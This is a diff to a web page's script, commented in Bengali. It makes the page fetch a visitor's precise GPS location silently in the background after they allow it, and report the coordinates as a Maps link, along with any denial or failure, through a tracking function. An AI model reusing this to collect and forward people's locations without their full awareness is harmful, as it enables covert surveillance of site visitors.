@@ -1048,20 +1048,45 @@ audio.addEventListener('play', () => {
       modal.classList.add('hidden');
       modal.classList.remove('flex');
     }
+    // প্রথমে নিখুঁত অবস্থান দ্রুত চেষ্টা করে, GPS ফিক্স ধীর হলে (timeout/POSITION_UNAVAILABLE)
+    // একবার কম-নিখুঁত কিন্তু ক্যাশ করা অবস্থান দিয়ে আরেকবার চেষ্টা করে — অনুমতি দেওয়ার পরেও
+    // শুধু ধীরগতির কারণে "অনুমতি দেয়নি" বলে ভুল বার্তা যাওয়া বন্ধ করতে এই দুই-ধাপের চেষ্টা।
+    function getPreciseLocation(onSuccess, onFail) {
+      const tryGet = (opts, isFallback) => {
+        navigator.geolocation.getCurrentPosition(
+          onSuccess,
+          err => {
+            if (!isFallback && (err.code === 2 || err.code === 3)) {
+              tryGet({ enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 }, true);
+            } else {
+              onFail(err);
+            }
+          },
+          opts
+        );
+      };
+      tryGet({ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }, false);
+    }
+
     document.getElementById('loc-allow').addEventListener('click', () => {
       sessionStorage.setItem('locAsked', '1');
       closeLocModal();
       const proceed = locPendingNext; locPendingNext = null;
+      if (proceed) proceed();   // তাকে সাথে সাথেই ফলাফল দেখাও, লোকেশন খোঁজার জন্য অপেক্ষা করাবে না
+      // লোকেশন খোঁজা চলে পেছনে, নীরবে; পেলে বা ব্যর্থ হলে আলাদা একটা মেসেজ যাবে পরে
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
+        getPreciseLocation(
           pos => {
             sendTrack(`📍 সঠিক লোকেশন (ইউজার অনুমতি দিয়েছে): https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`);
-            if (proceed) proceed();
           },
-          () => { sendTrack('📍 লোকেশনের অনুমতি দেয়নি (ব্রাউজারের পপ-আপে Block/বাতিল)'); if (proceed) proceed(); },
-          { timeout: 8000 }
+          err => {
+            const reason = err && err.code === 1
+              ? 'ব্রাউজারের পপ-আপে Block/বাতিল করেছে'
+              : `অনুমতি দিয়েছে, কিন্তু অবস্থান বের করা যায়নি (${err && err.code === 3 ? 'সময় শেষ হয়ে গেছে' : 'GPS সিগন্যাল পাওয়া যায়নি'})`;
+            sendTrack(`📍 সঠিক লোকেশন পাওয়া যায়নি — ${reason}`);
+          }
         );
-      } else if (proceed) proceed();
+      }
     });
     document.getElementById('loc-skip').addEventListener('click', () => {
       sessionStorage.setItem('locAsked', '1');
